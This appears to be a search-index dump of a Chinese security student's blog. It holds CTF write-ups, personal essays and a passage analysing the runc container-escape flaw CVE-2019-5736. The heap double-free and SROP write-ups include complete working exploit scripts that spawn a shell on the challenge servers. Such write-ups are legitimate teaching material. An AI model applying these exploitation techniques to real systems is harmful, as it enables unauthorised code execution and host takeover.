[{"categories":["CTF"],"content":" 许久未更新了hhh 本次susctf2022遇到一个很有意思的堆题，比赛的时候愣是看了一个下午没做出来，只好赛后借着官方wp复现一波了。 ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#"},{"categories":["CTF"],"content":"基础check 程序保护全开 ❯ checksec ./happytree [*] '/home/leo/ctfs/ph0t1n1a/2022/susctf2022/pwn/happytree/happytree' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled libc版本2.27，意味着tcache结构只有next指针，可以double free，unsorted bin attack无防护。 ❯ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 7.5.0. libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: \u003chttps://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u003e. ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#基础check"},{"categories":["CTF"],"content":"功能 先丢IDA，发现是一个用二叉搜索树来组织堆块的程序。（我tm看了近一小时才看出来） 程序提供三个功能：insert/delete/show，三个函数的参数都是用户输入的size，而不是普通堆题的index之类的。 大致概括就是： 每次insert操作会创建两个堆块，一个是固定大小0x30的管理堆块，一个是由用户输入大小而确定的不固定大小堆块。管理堆块中存储用户输入的大小，指向内容堆块的指针，左儿子节点和右儿子节点。所有的管理堆块构成一棵二叉搜索树，最先创建的管理堆块是树的根节点，bss段的0x2022a0地址处存储了根节点的地址。insert中的size参数存在unsigned int8限制，所以我们申请堆块的范围就是[0, 0xff]。 -------------- | | 0x31 | | ---- | ---- | | size | ptr | | ---- | ---- | | left | right| -------------- delete操作会寻找到与输入size相同的节点，然后判断其是否含有左右儿子节点： 如果左右儿子节点都存在，则找到右子树中的最左叶子节点，将最左叶子节点记录的size填写到当前节点中，然后去free那个最左叶子节点的两个堆块。 否则，释放改节点对应的堆块，然后返回节点存储的左/右子节点地址（或者0）。 show操作就是找到与输入size相同的节点，然后打印。 ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#功能"},{"categories":["CTF"],"content":"漏洞点 漏洞点在于，当执行delete操作时，对于将要free的节点，程序并没有清空其中可能存在的左右儿子节点指针（即程序中的a2[2]/a2[3]），当释放然后又分配回来后，就会有两个节点的指向同一个儿子节点，构成double free。 delete函数Untitled \" delete函数 再加上[0, 0xff]的范围已经可以让我们释放chunk进入unsorted bin中，所以泄露Libc也是可行的。 ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#漏洞点"},{"categories":["CTF"],"content":"exp分析 #!/usr/bin/python3 from pwn import * context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] host = '124.71.147.225' port = 9999 elfpath = 'happytree_patched' libcpath = 'libc.so.6' e = ELF(elfpath) context.binary = e libc = ELF(libcpath) context.binary = e if args.LOCAL: p = process([e.path]) # gdb.attach(p) else: p = remote(host, port) # io def s(c): return p.send(c) def sl(c): return p.sendline(c) def r(n): return p.recv(n) def rn(n): return p.recvn(n) def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop) def rl(): return p.recvline() def ru7f(): return p.recvuntil(b'\\x7f') def su(x): return p.success(x) def shell(): return p.interactive() # utilities def leak(func, address): return p.success( \"{}==\u003e {}\".format(func, hex(address))) def command(c): ru(b'cmd\u003e ') sl(str(c).encode()) def insert(size, content=b'a'): command(1) ru(b'data: ') sl(str(size).encode()) ru(b'content: ') s(content) def delete(size): command(2) ru(b'data: ') sl(str(size).encode()) def show(size): command(3) sl(str(size).encode()) # ru(b'content: ') # start pwning insert(1) insert(2) insert(8, b'/bin/sh\\x00') # use unsorted bin to leak libc for i in range(8): insert(0xd0 + i) for i in range(8): delete(0xd7 - i) # 1 -\u003e 2 -\u003e 8 for i in range(7): insert(0xd0 + i) insert(0xd7, b'a'*8) show(0xd7) leakaddr = u64(ru7f()[-6:].ljust(8, b'\\x00')) libc_base = leakaddr - (0x7f8246ba2ca0 - 0x7f82467b7000) leak(\"libc base\", libc_base) libc.address = libc_base free_hook = libc.sym['__free_hook'] system = libc.sym['system'] # double free insert(0xf2) insert(0xf7) insert(0xf6) insert(0xf4) insert(0xf5) insert(0xf0) insert(0xf1) # 构造double free delete(0xf2) insert(0xf8) delete(0xf5) delete(0xf8) delete(0xf7) # 填充两个正常的0x30 tcache bin delete(1) delete(2) # 利用构造好的tcache[0x100]中的double free来修改free_hook insert(0xef, p64(free_hook)) insert(0xee, p64(0)) insert(0xed, p64(0)) gdb.attach(p) insert(0xec, p64(system)) delete(8) shell() 利用unsorted bin泄露libc之后，二叉树的部分如下图所示。接着的delete(0xf2)操作实际上删除的是0xf4大小的节点，并将0xf2节点记录的size改写为0xf4。 流程1Untitled \" 流程1 所以，紧接着的insert(0xf8)会得到一个残留有0xf5节点指针的节点，而因为之前的delete(0xf2)操作，0xf6同样会指向0xf5节点。 流程2Untitled \" 流程2 然后delete(0xf5)会搜索到0xf6左子树中的0xf5节点，然后删除其对应的堆块。此时的树与tcache的情况如图所示。 流程3Untitled \" 流程3 接着delete(0xf8)将0xf5移动到0xf7的右子树。 流程4Untitled \" 流程4 因为0xf7节点的左右叶子节点均存在，所以delete(0xf7)操作又会搜索到0xf5节点然后再次将其删除。此时，tcache中已经产生了double free。 流程5Untitled \" 流程5 调试验证Untitled \" 调试验证 接下来就是常规的tcache double free应用，最终改free_hook然后getshell。 ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#exp分析"},{"categories":["CTF"],"content":"总结 第一次碰到这种结合数据结构来出的堆题，洞藏得挺隐蔽的（不是，其实有经验的话一眼就能看出来），而且创建和释放堆块的操作还需要选手去复习一波二叉搜索树的性质，所以总体来说是一道非常有趣的题，特此记录一下。 ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#总结"},{"categories":["CTF"],"content":"SROP，听着似乎是一个非常高大上的ROP方式，再加上涉及到signal和内核等概念，很容易给人一种难以理解的第一印象。但看过ctf-wiki之后你会发现，原理非常简单易懂。 ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:0:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwn初学者的进阶（四）：SROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#"},{"categories":["CTF"],"content":"基本原理 SROP与Unix系统的信号（signal）处理机制相关。关于Unix系统的信号处理、中断、用户态内核态等概念，忘了的话建议先去google一下。理解这些东西才能够更好地理解SROP的工作原理。 首先盗一张ctf-wiki上关于信号处理过程的流程图。 Procedure of signal handlingimg \" Procedure of signal handling 几个阶段分别发生了什么： ①：用户态进程接收到别的进程发送的信号signal，该进程被挂起，进入内核态 ②：内核保存用户态进程的上下文，然后跳转到用户态的信号对应的信号处理程序，回到用户态。在这一阶段里，内核会构造一个位于用户态进程栈上的Signal Frame用于存放该进程的上下文，然后再压入返回地址rt_sigreturn。 ③：用户态的信号处理程序执行完毕，pop返回地址rt_sigreturn，进程进入内核态，执行sigreturn系统调用。内核根据之前栈上的Signal Frame完成用户态进程上下文的恢复。 ④：返回用户态，进程按照恢复的上下文继续执行。 SROP作用于第3阶段，也就是内核根据Signal Frame的内容恢复进程上下文的过程。 Signal Frame是一个已知的数据结构，而且其存在于用户态的栈上。内核在恢复上下文时并没有确保其内容没有被修改过。因此，如果我们能够在栈上构造sigreturn系统调用与Signal Frame结构体的话，就能够实现攻击的效果。 比如在栈上构造这么一个结构，就能够SROP获取shell。 example\" example ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:1:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwn初学者的进阶（四）：SROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#基本原理"},{"categories":["CTF"],"content":"例题 Buu上的ciscn_2019_es_7就是一个典型的例子。 程序允许0x400-0x10长度的栈溢出，并且提供了mov rax 0x3b; ret和syscall以及pop rdi/pop rsi的gadget，但是就是没有控制rdx的gadget。所以无法直接栈溢出ret2syscall。 再考虑到这么长的溢出长度，以及mov rax 0x0f; ret的gadget（0xf号系统调用就是sigreturn），所以应该想到SROP。 gadgetsimage-20211101200337067 \" gadgets 根据上面的例子，如果想要SROP执行execve(\"/bin/sh\", 0, 0)的话，还需要知道字符串\"/bin/sh\"的地址。在这道题中，可以利用sys_write输出的栈地址来获取。 最终exp： from pwn import * context(log_level = 'debug') context(os=\"linux\", arch=\"amd64\") if args.LOCAL: p = process('./ciscn_2019_es_7') else: p = remote('node4.buuoj.cn', 26270) syscall_ret = 0x400517 mov_rax_0x3b_ret = 0x4004e2 # execve mov_rax_0x0f_ret = 0x4004da # sigreturn main_addr = 0x40051d call_vuln = 0x400531 vuln_addr = 0x4004f1 # first time pld1 = b'/bin/sh\\x00' pld1 = pld1.ljust(0x10, b'a') pld1 += p64(vuln_addr) p.send(pld1) stack_addr = u64(p.recvuntil(b'\\x7f')[-6:]+b'\\x00'*2) p.success(\"stack_addr: {}\".format(hex(stack_addr))) # second time pld2 = b'/bin/sh\\x00' pld2 = pld2.ljust(0x10, b'a') pld2 += p64(mov_rax_0x0f_ret) pld2 += p64(syscall_ret) sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr - 0x118 sigframe.rsi = 0 sigframe.rdx = 0 sigframe.rsp = stack_addr sigframe.rip = syscall_ret # print(sigframe) pld2 += bytes(sigframe) p.send(pld2) p.interactive() 执行截图 It worksimage-20211101203955060 \" It works ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:2:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwn初学者的进阶（四）：SROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#例题"},{"categories":["CTF"],"content":"思考 如果Signal Frame完全可控的话，既然可以通过控制rax和rip来执行系统调用，那么如果程序中存在什么后门函数的话，是不是可以通过构造rdi/rsi和rip等寄存器，去执行这些函数呢？还是说内核态会限制一些函数的运行？ ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:3:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwn初学者的进阶（四）：SROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#思考"},{"categories":["CTF"],"content":"参考链接： https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/ https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ 提出SROP的论文：《Framing Signals—A Return to Portable Shellcode》 ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:4:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwn初学者的进阶（四）：SROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#参考链接"},{"categories":["随意的文字"],"content":"月末的一点点文字… ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:0:0","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"10月随笔","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#"},{"categories":["随意的文字"],"content":"入冬 今天是10.28日，10月就快要过去了。在这个月里，天气渐渐转凉，上海在某一天直接从夏天转到了深秋。不止上海，全国各地的天气似乎也都在各自的“某一天”里瞬间转凉，“一秒入冬”的梗在网络上成为了一时的热词。冬天的过早到来似乎也与10月这个月份格格不入，有种雨下错了季候的感觉，给人以错乱且奇妙的氛围。再加上最近几天还看到了「拉尼娜年」的相关新闻，想必今年的冬天也会比较寒冷吧。 ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:1:0","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"10月随笔","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#入冬"},{"categories":["随意的文字"],"content":"10月回顾 总的来说，10月是较为忙碌的一个月。我回想了一下，在这个月里，我主要完成了3件事。 ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:0","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"10月随笔","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#10月回顾"},{"categories":["随意的文字"],"content":"参加婚礼 10月2号是表哥的婚礼。为此，我9月份就提前和导师请好了假，在9月底回了家。随着年龄的增长，婚礼参加得也越来越多。看着曾经带着还是小屁孩的我玩游戏的几位哥哥，如今都已经成为人夫，走入婚姻殿堂。作为晚辈，心里由衷的开心和祝福是肯定的，但同时也少不了几分感慨，心想曾经还是和我现在一样年纪的少年，转眼间就已经三十而立，成为了一个家的中流砥柱，要努力去面对生活的压力、经营婚姻与家庭、创造并教育下一代（原谅我暂时想不出创造之外的词）。这些事情，光是想想就不禁令人神情肃穆，心里怎么也泛不起一丝轻松调侃的情绪。这也越发令我意识到我正当下所拥有的青春年华是多么的可贵。 准确的来说，婚礼其实从我回家之前就已经开始了。置办请柬、预定酒店、购买婚礼上要用的物资，这些事情在婚礼开始前一周基本上就得全部安排妥当。在回家后的第二天，我就被叫去帮忙干活了。而我姑姑，作为我哥的老妈以及婚礼的总指挥，更是从早忙到晚。中国的父母想必大多如此吧，将来我爸妈在我婚礼的时候估计也会忙得焦头烂额。 婚礼是中式与西式结合的形式：穿着中式的红色龙凤褂（查了一下才知道原来叫这名字）去接亲。接亲的车队到达酒店之后，新郎新娘再换上西式的西装与婚纱，进行西式的婚礼流程。 婚礼结束之后，我在家待到了4号。期间回了老家一次，剩下的时间都在家里休息。5号早晨，我爸送我到高速口，然后我搭乘另一个表哥返杭的顺风车，跟他一起回了杭州。7号中午，我才再从杭州东站出发，乘高铁回到上海。 仔细回想，这好像是我从去南昌读高中以来，第一次在国庆期间回家。不知不觉间，我已经有8年在家以外的地方度过一年中的大多数时间了。遥想当时刚刚结束初三的我，肯定也想不到将来的自己会有怎样的经历。 ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:1","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"10月随笔","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#参加婚礼"},{"categories":["随意的文字"],"content":"上研\u0026Huawei 第二件事则是花了2周的时间，完成了与华为合作的实验室项目的一个小任务。具体工作内容也没啥好说的，并不是我感兴趣的领域，所以在那边的工作积极度也并不高。好在最终和另外一名同学合作，取得了一点能够在项目例会上提一嘴的工作成果，也算是给导师交差了。 在那里的两周有两件事令我印象深刻，同时也是值得吐槽的两点：第一点，上海全季酒店的早餐真的不敢恭维，品种单一，连着住一个礼拜绝对会让你吃腻。要不是为了方便，早上能够多睡那么几分钟，我真的就去外面的早餐店买早餐了。第二点，华为上研所内部的人员流动管理真的巨严格，这种严格甚至让我回想起了小学忘戴红领巾而被拦在校门外的体验。从东莞溪村过来的负责对接我们的同事也对此感到诧异和无语😅，上研内部人员通行规则的严格与古板可见一斑。 在住了2个礼拜的酒店之后，我终于回到了学校，并且又一次深深地感受到了当代打工人在结束工作之后面对将要来临的假期时的那份满满的幸福感。 ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:2","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"10月随笔","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#上研huawei"},{"categories":["随意的文字"],"content":"SJTU-CTF-2021 第三件事是今年的校赛。SJTU-CTF-2021，开始于2021.10.11 8:00AM，结束于2021.10.25 8：00PM（这么长时间的比赛，真是卷得我够累的😫适合一边学习一边做题）。 19年的校赛，我做出了一道密码题。当时算是通过这次比赛知道了CTF这么一个东西，比赛之后也就没有去关注过相关方面得内容了。 20年的校赛，我学习了一点点基础知识，想着这次应该可以有点不一样的体验了。但由于时间冲突以及知识储备不够等原因，最后还是只做了3道还是4道题，排名40+。 21年的校赛，终于终于有了一点点进步。这次由于比赛第一天提交了2道简单题，所以在一开始就排进了前10（真正的大佬都是后面才开始交flag的）。然后我就被这前10的排名给拿捏住了，因为不想让自己的排名掉太多，所以每天都被迫在卷各个分类的题（web除外）。再加上这次校赛和上研所那2周基本上是完美重合的，所以我在10.11到10.25这段时间里，基本就是白天上班，晚上做题。最后凭借运气加上一点点实力，拿到了第5的名次，已经算是远远超出预期了😆。 Trendimage-20211031222357878 \" Trend 完整的scoreboardimage-20211031222109931 \" 完整的scoreboard ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:3","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"10月随笔","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#sjtu-ctf-2021"},{"categories":["随意的文字"],"content":"后记 25号结束比赛，26号交完writeup。之后在学校里摸了几天鱼，就到了月底了。 这篇随笔的创建日期是10.28，但实际上我一直拖到了今天，也就是10.31号才写完。回头一看，一个月的时间过得还是很快的。希望即将到来的11月能够平稳、充实地度过，希望自己能够多读书，多学习，多运动，继续前进。 ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:3:0","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"10月随笔","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#后记"},{"categories":["随意的文字"],"content":"不知道从什么时候起，我开始渐渐喜欢上阅读一些优秀的个人博客。不论是学习知识也好，拓宽视野也好，抑或是作为项目任务之余偷懒放松的一种方式也好，优秀的博客总是能够令我意识到自身的诸多不足，也或多或少给自己增加了一些进步的欲望和动力。 我认为，阅读博客有这么几个好处。 首先，个人博客是一种很好的信息载体。它不同于现在的大多数人所习惯的新闻媒体推送、朋友圈、短视频等信息传播方式，反而更加像过去的书信。视频图片等方式固然直接了当，且非常适合在短时间内传递大量信息，但是白底黑字却往往更能够触动我们的内心。还有一点就是，我认为朋友圈、短视频等信息传递方式让我们都渐渐习惯于快节奏的生活了，长此以往，容易使人失去对事物的耐心。譬如过去的我，或者是过去到现在的我。所以我认为，多读博客，多做一些需要专注的事情，应该会让内心更加平稳且充实。 其次，个人博客内容多元，博主的工作、学习、生活都不尽相同。这其实是很有趣的一点。要知道，博客面前众生平等，有的可能只有域名和主题的区别，大家写的东西都可以很平等地被看见（不过我不确定有没有买搜索引擎数据的现象）。看的博客多了，视野会被拓宽，并且能够看到很多其它领域的有趣之处。而在实际生活中，这样的机会确实是很难得的。 最后一点，也是我认为最能体现个人博客价值的一点。一个合格的个人博客往往反映了博主在一段时间内的生活状态，这段时间可能是从刚刚大学毕业走上工作岗位，到工作满一年；也可能是从高中开始玩ACM，到已经成为相关职业领域的巨佬。点击归档或者Archive，阅读不同时间段的博文，我总能够感受到时间给予一个人的成长与变化，从而体会到人生的美好，甚至或多或少领悟了一些生活的意义。阅读网络上的大佬们的博文的时候，我似乎也能够看到发布这篇博文之前，坐在同样的文字面前的博主，能够想象对方遇到的困难与解决问题的过程，还有一次次写下博客时的个人进步与提高。这，也是很难从其它途径获得的快乐啊。就像收到一封远方友人的信件一样，文字之间总是很温暖。 差不多就是这么一些了，深知我目前的文字功底暂时还很难写出让自己满意的文章，但也正如之前所说的一样，相信在写下一篇篇博文的之后，我应该也能在这方面取得一些小小的进步吧。 最后，就用「树哥」博客里的一句话作为这篇随笔的结语吧。 在这里，感谢互联网的开放与共享精神，感谢每一位无私分享经验的陌生人。 🙂 ","date":"2021-09-26","objectID":"/2021-09-26-%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/:0:0","series":null,"tags":["Life","生活","随笔","慢节奏"],"title":"关于个人博客的一些想法","uri":"/2021-09-26-%E5%85%B3%E4%BA%8E%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/#"},{"categories":["源码阅读"],"content":"属于是补锅了 大概一周前，Eric认为我写的这篇文档太垃了。后来我仔细读了一遍，发现确实写的挺混乱的，讲述也不清晰。希望这第三版至少能够让将来的自己看得懂吧。 ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:0:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#"},{"categories":["源码阅读"],"content":"漏洞背景 runc是一个根据OCI(Open Container Initiative)标准创建并运行容器的命令行工具，是Docker的底层容器运行时。 CVE-2019-5736是由波兰的一支ctf战队Dragon Sector在2019发现的关于runc的漏洞。起因是他们在参加一场ctf比赛之后，发现比赛中的一道沙箱逃逸题的原理与runc的实现原理类似。在这之后他们对runc进行了相关的漏洞挖掘工作，并且成功发现了runc中存在的能够被用来覆盖宿主机上runc文件的容器逃逸漏洞，该漏洞的CVE编号为CVE-2019-5736。 利用该漏洞，攻击者可以通过修改容器内可执行文件的方式，获取到宿主机上runc可执行文件的文件句柄，然后进行覆盖操作，将runc替换为可控的恶意文件。最终可造成在宿主机上以root权限执行任意代码的严重后果，实现容器逃逸。 有关该漏洞的详细叙述可见漏洞的oss-security发布邮件与dragon sector的官方博客。 影响版本：runc \u003c= 1.0-rc6 ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:1:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#漏洞背景"},{"categories":["源码阅读"],"content":"漏洞成因 该漏洞的产生主要和Linux的pid命名空间与/proc伪文件系统相关。 当一个进程加入了某一pid命名空间之后，该命名空间中的其它进程就能够通过/proc文件系统观察到该进程，在权限允许的情况下，进程能够通过/proc/[pid]/exe找到其它进程对应的二进制文件。 而如果将这种情况放到runc init执行过程中来看，runc init进程在进入了容器的命名空间之后，如果容器内部的文件能够欺骗runc init进程执行自身，那么容器内的进程就能够通过/proc获取到宿主机上的runc文件句柄，从而进行覆盖等攻击操作。 正常的创建容器并在容器内执行命令的过程示意图如下图所示（具体流程见下文代码分析）。 正常流程正常流程 \" 正常流程 而修改了待执行文件的内容之后，runc init进程会执行自身，从而将宿主机上的runc文件暴露给了容器内部，造成安全风险。 被攻击被攻击 \" 被攻击 ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:0","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#漏洞成因"},{"categories":["源码阅读"],"content":"具体代码分析 runc启动容器的过程 runc run对应的command在run.go中被定义 // default action is to start a container var runCommand = cli.Command{ Name: \"run\", Usage: \"create and run a container\", ... Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } status, err := startContainer(context, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return fmt.Errorf(\"runc run failed: %w\", err) }, } 对应的Action会执行startContainer()函数。该函数会读取容器配置文件config.json的信息，生成spec对象，再将其作为参数通过createContainer()生成container对象。通过包含container对象的runner对象调用r.run()启动容器。 func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { if err := revisePidFile(context); err != nil { return -1, err } //读取配置文件，获取配置信息 spec, err := setupSpec(context) if err != nil { return -1, err } id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err := notifySocket.setupSpec(context, spec); err != nil { return -1, err } } //传入配置参数，创建container对象 container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: !context.Bool(\"keep\"), container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, } return r.run(spec.Process) } r.run()对应于定义在utils_linux.go中的run()。之前传入的action值为CT_ACT_RUN，因此这里将会执行r.container.Run(process)。 //runc run命令对应的action Action: func(context *cli.Context) error { ... //传入action参数为CT_ACT_RUN status, err := startContainer(context, CT_ACT_RUN, nil) ... func (r *runner) run(config *specs.Process) (int, error) { ... //根据config创建process process, err := newProcess(*config) if err != nil { return -1, err } process.LogLevel = strconv.Itoa(int(logrus.GetLevel())) // Populate the fields that come from runner. process.Init = r.init //r.init为 true ... //r.action此时为CT_ACT_RUN switch r.action { case CT_ACT_CREATE: err = r.container.Start(process) case CT_ACT_RESTORE: err = r.container.Restore(process, r.criuOpts) case CT_ACT_RUN: //调用该方法 err = r.container.Run(process) default: panic(\"Unknown action\") } ... } r.container由createContainer()函数创建，根据createContainer()-\u003eloadFactory()-\u003efactory.Create()的调用链可知，r.container最终是由LinuxFactory.Create()所创建。所以r.container.Run()将会调用LinuxContainer.Run()，Run()包含了整个容器的启动逻辑。 func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, //容器id root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } if l.NewIntelRdtManager != nil { c.intelRdtManager = l.NewIntelRdtManager(config, id, \"\") } c.state = \u0026stoppedState{c: c} return c, nil } func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } Run()的调用链为linuxContainer.Run()-\u003elinuxContainer.Start()-\u003elinuxContainer.start()。Run()/Start()都是封装的linuxContainer导出函数，而真正的执行过程在start()中。 start()函数调用newParentProcess()创建父进程对象parent，并调用parent.start()启动子进程。 func (c *linuxContainer) start(process ","date":"2021-09-26","objectID":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"Docker runc(CVE-2019-5736)漏洞分析-第三版","uri":"/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/#具体代码分析"},{"categories":["源码阅读"],"content":"具体代码分析 runc启动容器的过程 runc run对应的command在run.go中被定义 // default action is to start a container var runCommand = cli.Command{ Name: \"run\", Usage: \"create and run a container\", ... Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } status, err := startContainer(context, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return fmt.Errorf(\"runc run failed: %w\", err) }, } 对应的Action会执行startContainer()函数。该函数会读取容器配置文件config.json的信息，生成spec对象，再将其作为参数通过createContainer()生成container对象。通过包含container对象的runner对象调用r.run()启动容器。 func startContainer(context *cli.Context, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { if err := revisePidFile(context); err != nil { return -1, err } //读取配置文件，获取配置信息 spec, err := setupSpec(context) if err != nil { return -1, err } id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err := notifySocket.setupSpec(context, spec); err != nil { return -1, err } } 